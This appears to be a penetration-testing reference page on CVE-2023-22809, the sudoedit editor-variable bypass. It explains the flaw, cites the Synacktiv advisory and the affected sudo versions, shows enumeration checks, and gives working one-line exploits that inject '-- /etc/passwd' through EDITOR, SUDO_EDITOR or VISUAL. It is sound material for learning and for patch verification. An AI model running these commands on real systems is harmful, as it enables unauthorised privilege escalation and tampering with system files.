---
description: CVE-2023-22809
---

# Sudoedit Bypass

## Theory

Sudo uses user-provided environment variables to let its users select their editor of choice. The content of these variables extends the actual command passed to the sudo\_edit() function. However, the latter relies on the presence of the `--` argument to determine the list of files to edit. The injection of an extra `--` argument in one of the authorized environment variables can alter this list and lead to privilege escalation by editing any other file with privileges of the RunAs user. This issue occurs after the sudoers policy validation. - [Synacktiv](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)

The vulnerability affect sudo versions **1.8.0** to **1.9.12p1**.

## Practice

{% tabs %}
{% tab title="Enumeration" %}
To exploit, sudo version must be vulnerable (**1.8.0** to **1.9.12p1**)

```bash
$ sudo -V
Sudo version 1.8.0
```

You must be able to run sudoedit with sudo

```bash
$ sudo -l
[sudo] password for user:
Matching Defaults entries for user on vulnserver:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User user may run the following commands on vulnserver:
    (ALL:ALL) sudoedit /etc/custom/service.conf
```

And env\_delete shouldn't be set to affected variables:

```bash
env_delete+="SUDO_EDITOR VISUAL EDITOR"
```
{% endtab %}

{% tab title="Exploit" %}
To exploit it, we may use one of the following commands:

```bash
EDITOR='vim -- /etc/passwd' sudoedit /etc/custom/service.conf

SUDO_EDITOR='vim -- /etc/passwd' sudoedit /etc/custom/service.conf

VISUAL='vim -- /etc/passwd' sudoedit /etc/custom/service.conf
```
{% endtab %}
{% endtabs %}

### References

{% embed url="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf" %}
